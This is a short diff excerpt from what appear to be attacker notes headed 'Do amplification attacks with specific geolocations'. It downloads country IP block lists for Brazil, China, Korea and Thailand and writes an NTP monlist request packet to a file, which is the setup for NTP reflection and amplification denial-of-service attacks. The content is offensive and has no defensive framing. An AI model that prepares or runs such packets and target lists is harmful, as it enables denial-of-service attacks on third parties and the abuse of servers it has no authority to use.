@@ -3,9 +3,13 @@ Do amplification attacks with specific geolocations
 
 
 wget https://www.ipdeny.com/ipblocks/data/countries/br.zone
+
 wget https://www.ipdeny.com/ipblocks/data/countries/cn.zone
+
 wget https://www.ipdeny.com/ipblocks/data/countries/kr.zone
+
 wget https://www.ipdeny.com/ipblocks/data/countries/th.zone
+
 
 echo -ne "\x17\x00\x03\x2a\x00\x00\x00\x00" > ntp.pkt
 
